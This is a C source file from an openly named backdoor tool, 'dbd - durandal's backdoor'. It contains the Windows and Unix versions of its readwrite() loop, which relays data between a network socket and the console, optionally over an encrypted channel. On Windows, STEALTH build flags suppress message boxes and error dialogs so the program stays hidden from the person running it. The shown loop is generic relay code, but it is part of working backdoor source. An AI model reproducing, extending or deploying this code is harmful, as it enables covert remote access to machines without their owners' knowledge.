/*
 * dbd - durandal's backdoor
 * Copyright (C) 2013 Kyle Barnthouse <durandal@gitbrew.org>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; either version 2 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc., 59
 * Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * See the COPYING file for more information.
 */

#ifdef WIN32

/* for Windows... */
int readwrite(SOCKET peersd) {
    char buf[BUFSIZE];

    #ifndef WINMAIN
        int stdin_is_tty;
    #endif


    #ifndef WINMAIN
        if (!_isatty(STDOUT_FILENO)) {
            _setmode(STDOUT_FILENO, _O_BINARY);
        }

        if ((stdin_is_tty = _isatty(STDIN_FILENO)) == FALSE) {
            _setmode(STDIN_FILENO, _O_BINARY);
        }
    #endif


    while(1) {
        fd_set fds;
        struct timeval tv;

        FD_ZERO(&fds);
        FD_SET(peersd, &fds);

        tv.tv_sec = 0;
        tv.tv_usec = 1000;

        if (select(FD_SETSIZE, &fds, NULL, NULL, &tv) != SOCKET_ERROR) {
            int cnt;
            if (FD_ISSET(peersd, &fds)) {
                if (use_encryption) {
                    /* note: pel_recv_msg() modifies cnt */
                    cnt = sizeof(buf);
                    if (pel_recv_msg(peersd, buf, &cnt) != PEL_SUCCESS) {
                        #ifdef DEBUG
                            #ifndef WINMAIN
                                fprintf(stderr, "pel_recv_msg failed\n");
                            #else
                                errbox("pel_recv_msg failed!");
                            #endif
                        #endif
                        break;
                    }
                    if (cnt == 0) {
                        break;
                    }
                } else {
                    if ((cnt = recv(peersd, buf, sizeof(buf), 0)) == SOCKET_ERROR) {
                        int wsaerr = WSAGetLastError();
                        if (wsaerr == WSAEWOULDBLOCK) { /* don't think this is used */
                            continue;
                        } else {
                            break;
                        }
                    } else if (cnt == 0) {
                        break;
                    }
                }

                #ifndef WINMAIN
                    if (highlight_incoming) {
                        write(STDOUT_FILENO, highlight_prefix, sizeof(highlight_prefix)-1);
                        write(STDOUT_FILENO, buf, cnt);
                        write(STDOUT_FILENO, highlight_suffix, sizeof(highlight_suffix)-1);
                    } else {
                        write(STDOUT_FILENO, buf, cnt);
                    }
                #else
                    #ifndef STEALTH
                    forkmsgbox(buf, cnt);
                    #endif
                #endif

            }
        } else {
            #ifndef WINMAIN
            if (!quiet)
                fprintf(stderr, "select(): %s\n", WSAstrerror(WSAGetLastError()));
            #else
                #ifndef STEALTH
                if (!quiet)
                    wsaerrbox("select()", WSAGetLastError());
                #endif
            #endif
            break;
        }

#ifndef WINMAIN
        if (stdin_is_tty) {
            if (kbhit()) {
                /* once a key is hit, read() will block until CR has been
                 * received :\ */
                int cnt = read(STDIN_FILENO, buf, sizeof(buf));
                if (cnt <= 0) {
                    break;
                }

                if (use_encryption) {
                    if (prefix_outgoing_with) {
                        char stackbuf[128];
                        snprintf(stackbuf, sizeof(stackbuf), "%s%s", prefix_outgoing_with, separator_between_prefix_and_data);
                        if (pel_send_msg(peersd, stackbuf, strlen(stackbuf)) != PEL_SUCCESS) {
                            #ifdef DEBUG
                                fprintf(stderr, "pel_send_msg failed\n");
                            #endif
                            break;
                        }
                    }
                    if (pel_send_msg(peersd, buf, cnt) != PEL_SUCCESS) {
                        #ifdef DEBUG
                            fprintf(stderr, "pel_send_msg failed\n");
                        #endif
                        break;
                    }
                } else {
                    if (prefix_outgoing_with) {
                        char stackbuf[128];
                        snprintf(stackbuf, sizeof(stackbuf), "%s%s", prefix_outgoing_with, separator_between_prefix_and_data);
                        send(peersd, stackbuf, strlen(stackbuf), 0);
                    }
                    send(peersd, buf, cnt, 0);
                }
            }
        } else {
            /* for every line read from the socket, this will block until a CR
               has been received :(
             */
            int cnt = read(STDIN_FILENO, buf, sizeof(buf));
            if (cnt <= 0) {
                break;
            } else {
                if (use_encryption) {
                    if (pel_send_msg(peersd, buf, cnt) != PEL_SUCCESS) {
                        #ifdef DEBUG
                            #ifndef WINMAIN
                                fprintf(stderr, "pel_send_msg failed\n");
                            #else
                                #ifndef STEALTH
                                errbox("pel_send_msg failed!");
                                #endif
                            #endif
                        #endif
                        break;
                    }
                } else {
                    send(peersd, buf, cnt, 0);
                }
            }
        }
#endif

    }
    return 0;
}

#else

/* for Unix-like operating systems... */
int readwrite(int peersd) {
    char buf[BUFSIZE];
    int skipstdin = 0;

    while(1) {
        fd_set fds;
        struct timeval to1;
        int sel;

        FD_ZERO(&fds);
        if (!skipstdin) {
            FD_SET(STDIN_FILENO, &fds);
        }
        FD_SET(peersd, &fds);

        if (immobility_timeout > 0) {
            to1.tv_sec = immobility_timeout;
            to1.tv_usec = 0;
            sel = select(FD_SETSIZE, &fds, NULL, NULL, &to1);
        } else {
            sel = select(FD_SETSIZE, &fds, NULL, NULL, NULL);
        }
        if (sel > 0) {
            int cnt;
            if (FD_ISSET(STDIN_FILENO, &fds)) {
                if ((cnt = read(STDIN_FILENO, buf, sizeof(buf))) < 1) {
                    if ((cnt < 0) && (errno == EWOULDBLOCK || errno == EAGAIN)) {
                        continue;
                    } else {
                        skipstdin = 1;
                        continue;
                    }
                }

                if (use_encryption) {
                    if (prefix_outgoing_with) {
                        char stackbuf[128];
                        snprintf(stackbuf, sizeof(stackbuf), "%s%s", prefix_outgoing_with, separator_between_prefix_and_data);
                        if (pel_send_msg(peersd, stackbuf, strlen(stackbuf)) != PEL_SUCCESS) {
                            #ifdef DEBUG
                                fprintf(stderr, "pel_send_msg failed\n");
                            #endif
                            break;
                        }
                    }
                    if (pel_send_msg(peersd, buf, cnt) != PEL_SUCCESS) {
                        #ifdef DEBUG
                            fprintf(stderr, "pel_send_msg failed\n");
                        #endif
                        break;
                    }
                } else {
                    if (prefix_outgoing_with) {
                        char stackbuf[128];
                        snprintf(stackbuf, sizeof(stackbuf), "%s%s", prefix_outgoing_with, separator_between_prefix_and_data);
                        send(peersd, stackbuf, strlen(stackbuf), 0);
                    }
                    send(peersd, buf, cnt, 0);
                }
            }

            if (FD_ISSET(peersd, &fds)) {
                if (use_encryption) {
                    /* note: pel_recv_msg() modifies cnt */
                    cnt = sizeof(buf);
                    if (pel_recv_msg(peersd, buf, &cnt) != PEL_SUCCESS) {
#ifdef DEBUG
                        fprintf(stderr, "pel_recv_msg failed\n");
#endif
                        break;
                    }
                } else {
                    if ((cnt = recv(peersd, buf, sizeof(buf), 0)) < 1) {
                        if ((cnt < 0) && (errno == EWOULDBLOCK || errno == EAGAIN)) {
                            continue;
                        } else {
                            break;
                        }
                    }
                }
                if (highlight_incoming) {
                    write(STDOUT_FILENO, highlight_prefix, sizeof(highlight_prefix)-1);
                    write(STDOUT_FILENO, buf, cnt);
                    write(STDOUT_FILENO, highlight_suffix, sizeof(highlight_suffix)-1);
                } else {
                    write(STDOUT_FILENO, buf, cnt);
                }
            }
        } else {
            /* break loop if select() returns 0 or < 0 */
            break;
        }
    }
    return 0;
}
#endif
